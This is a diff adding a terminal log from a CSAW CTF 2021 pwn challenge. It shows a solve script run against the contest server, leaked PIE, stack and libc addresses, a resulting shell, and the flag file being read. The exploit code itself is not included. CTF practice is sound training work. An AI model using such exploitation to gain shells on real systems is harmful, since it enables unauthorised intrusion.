@@ -1,0 +1,29 @@
+mito@ubuntu:~/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_procrastination-simulator$ python solve.py r
+[*] '/home/mito/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_procrastination-simulator/chall49'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to auto-pwn.chal.csaw.io on port 11050: Done
+[*] '/home/mito/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_procrastination-simulator/libc6_2.31-0ubuntu9.2_amd64.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+pie_base   = 0x55f9f517d000
+stack_leak = 0x7ffe40a70c28
+puts_addr  = 0x7f088838c5a0
+libc_base  = 0x7f0888305000
+[*] Switching to interactive mode
+
+$ id
+uid=1000(chal) gid=1000(chal) groups=1000(chal)
+$ ls -l
+total 68
+-r-xr-xr-x 1 root chal 12192 Sep  8 02:25 binary_50
+-r--r--r-- 1 root chal 51816 Sep  8 02:25 binary_50.txt
+-r--r--r-- 1 root chal    93 Sep  8 02:25 flag.txt
+$ cat flag.txt
+flag{c0ngr4tul4t10ns,4ut0-pwn3r!5h0ut0ut5_t0_UTCTF_f0r_th31r_3xc3ll3nt_AEG_ch4ll3ng3_1n_M4y}
